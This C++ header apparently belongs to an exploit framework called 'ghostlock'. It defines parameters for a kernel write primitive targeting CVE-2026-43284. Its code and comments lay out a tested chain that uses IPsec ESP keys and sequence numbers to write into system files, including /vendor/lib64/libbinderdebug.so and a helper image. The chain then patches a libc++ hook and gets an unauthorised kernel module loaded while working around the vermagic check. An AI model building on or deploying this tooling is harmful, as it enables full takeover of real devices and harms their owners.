#pragma once
/** @file backend/cve_2026_43284/access_params.hpp
 *  What this backend's kernel access needs besides an address and a value.
 *
 *  What is here and why it is here rather than in the caller's own constants: the whole chain was
 *  driven on the device in three rounds, and every value that had to be handed in from outside is
 *  named below with the round that proved it necessary. The rule the fields follow is the project's:
 *  a value the execution layer cannot derive is a parameter, and one it can derive is not. So the
 *  credentials, the positions, the paths, the session's sequence, the device facts the module
 *  precheck needs, the hook's plan and the finish's markers all arrive here -- from a script, a
 *  profile or a caller -- and nothing in this backend invents them.
 *
 *  Shape: the class carries borrowed strings as {pointer, length} pairs, because a path is not
 *  NUL-terminated inside a document and a length is what the door and the bridge take anyway. The
 *  vectors are ignored, because this backend's route axis is empty: what names it is the backend id.
 *
 *  Pairing: every borrowed string is a pair, and a pair with only one half set is refused by name
 *  (see consistent()) rather than read as an empty path -- a path of length zero is not a path.
 */
#include <cstddef>
#include <cstdint>
#include <string_view>

#include "backend/cve_2026_43284/hook/sentry_hook.hpp"
#include "contract/kernel_access.hpp"

namespace ghostlock::backend::cve_2026_43284 {
    /** The session's secrets, as the access receives them. A plain struct rather than a pointer,
     *  so the access owns what it was given and can zero it on the way out; the fields mirror the
     *  old tree's parameter type, whose header names these as runtime credentials. */
    struct SaMaterial final {
        std::uint32_t spi = 0U;
        /** The encapsulated port the socket connects from. The old tree's runtime frame carries it,
         *  and the socket cannot be made without it, so it belongs to the credentials rather than
         *  being invented at the door. */
        std::uint16_t encap_port = 0U;
        /** The sender port, the frame's other half of the same fact. */
        std::uint16_t sender_port = 0U;
        /** The integrity length in bytes: the write truncates the ICV to it, so a value of zero is
         *  not a default to guess but something the caller must state. */
        std::uint8_t icv_len = 0U;
        /** The AES key; the write derives its IV from it and the old block's content. */
        std::uint8_t aes_key[32] = {};
        /** The integrity key for the ESP trailer. */
        std::uint8_t hmac_key[32] = {};
        /** Whether a caller has supplied anything at all. All-zero is not a credential, it is an
         *  unset one, and the access refuses to write with it rather than using it. */
        bool set = false;
    };

    /** A borrowed string: a path that is not NUL-terminated, as documents and frames carry them. */
    struct PathView final {
        const char *bytes = nullptr;
        std::size_t length = 0U;

        [[nodiscard]] constexpr bool empty() const noexcept {
            return bytes == nullptr || length == 0U;
        }
        /** Half a pair: a pointer with no length, or a length with no pointer. */
        [[nodiscard]] constexpr bool half_set() const noexcept {
            return (bytes == nullptr) != (length == 0U);
        }
    };

    class AccessParams final : public contract::KernelAccess::AccessMiscParameters {
    public:
        /* ---- Required by any write ---- */

        /** The credentials this session was given. */
        SaMaterial sa{};
        /** Where in the carrier to write. Zero is a legitimate position, so it is not a sentinel. */
        std::uint64_t offset = 0U;
        /** Whether a position was given at all, since zero cannot double as one. */
        bool offset_set = false;

        /* ---- Round 1 (the write face): which file, and where inside it ---- */

        /** The carrier patch #2 writes the module into. Found necessary when the tool had to name
         *  \`/vendor/lib64/libbinderdebug.so\` itself; the door opens it, and when this process
         *  cannot, the bridge reads and splices it instead. */
        PathView carrier{};
        /** The position the write treats as the carrier's start. Found necessary because the module
         *  goes at zero while the harness's one-shot carrier used other bases. */
        std::uint64_t carrier_base = 0U;
        /** The one-shot carrier a process can open itself: the same relaxation the retired tree kept
         *  behind \`--allow-dev-target\`, and the only way to exercise the primitive on a file whose
         *  vendor path is unreadable. */
        PathView dev_carrier{};

        /* ---- Round 2 (patch #1 and the bridges) ---- */

        /** Patch #1's target: the file the helper image is written over, and the file the bridges
         *  execute afterwards. Found necessary when the vendor carrier turned out to be unreadable
         *  and both halves of the write had to come from somewhere else. */
        PathView patch_target{};

        /** The sequence the session has reached. Found necessary the hard way: the sequence belongs
         *  to the security association and not to a window, and a window that restarted at one had
         *  every datagram dropped by the kernel's inbound anti-replay window -- twice on the device.
         *  A caller that writes through more than one window (patch #1, the carrier, the hook) threads
         *  this value from one to the next. */
        std::uint32_t sequence = 0U;
        bool sequence_set = false;

        /** The three module-build facts the kernel's vermagic string carries and userspace cannot
         *  probe, plus the release to compare against. Found necessary when the precheck refused the
         *  module that the PASS run had loaded: with CRCs the kernel compares only the tail of the
         *  vermagic, and which tail is right depends on these flags. */
        PathView kernel_release{};
        bool kernel_modversions = true;
        bool kernel_module_force_unload = false;
        bool kernel_preempt = false;

        /* ---- Round 3 (the sentry hook) ---- */

        /** The image the hook patches. Found necessary when the site and the landing room turned out
         *  to be facts of one particular libc++ build. */
        PathView hook_image{};
        /** The plan: the site, the guard, the displaced word and the landing room. Carried whole
         *  because every field is a fact about that image, and a plan derived for another image must
         *  be refused rather than written. */
        hook::SentryPlan hook_plan{};
        bool hook_plan_set = false;

        /* ---- Round 3 (the finish) ---- */

        /** How long the orphan waits before it exits, so the hook is armed first. */
        std::uint32_t trigger_delay_ms = 0U;
        /** How long the finish waits for the load, and the markers it watches: the module's own
         *  files in the device's order (failure first, so a stale success cannot mask a fresh
         *  failure), the in-flight marker, and the module directory the retired chain polled. */
        std::uint32_t wait_ms = 0U;
        PathView success_marker{};
        PathView failure_marker{};
        PathView in_flight_marker{};
        PathView module_marker{};
        /** The name to look for under /sys/module, from the module's own .modinfo. */
        PathView module_name{};

        [[nodiscard]] std::string_view name() const noexcept override { return "cve_2026_43284"; }

        /** Whether every borrowed string is a whole pair. A half pair is a caller's mistake and is
         *  refused by name rather than read as an empty path. */
        [[nodiscard]] constexpr bool consistent() const noexcept {
            return !carrier.half_set() && !dev_carrier.half_set() && !patch_target.half_set() &&
                   !hook_image.half_set() && !kernel_release.half_set() && !success_marker.half_set() &&
                   !failure_marker.half_set() && !in_flight_marker.half_set() &&
                   !module_marker.half_set() && !module_name.half_set();
        }

        /** Whether this set is complete enough to bring the route up: it needs credentials, and it
         *  needs them to be a whole set rather than a half-specified one. */
        [[nodiscard]] constexpr bool usable_for_initialize() const noexcept {
            return sa.set && consistent();
        }
        /** Whether it is complete enough to write: it needs a position as well. */
        [[nodiscard]] constexpr bool usable_for_access() const noexcept {
            return usable_for_initialize() && offset_set;
        }
        /** Whether the session's sequence came with the set: only then may a window continue it. */
        [[nodiscard]] constexpr bool has_sequence() const noexcept { return sequence_set; }
    };
}  // namespace ghostlock::backend::cve_2026_43284
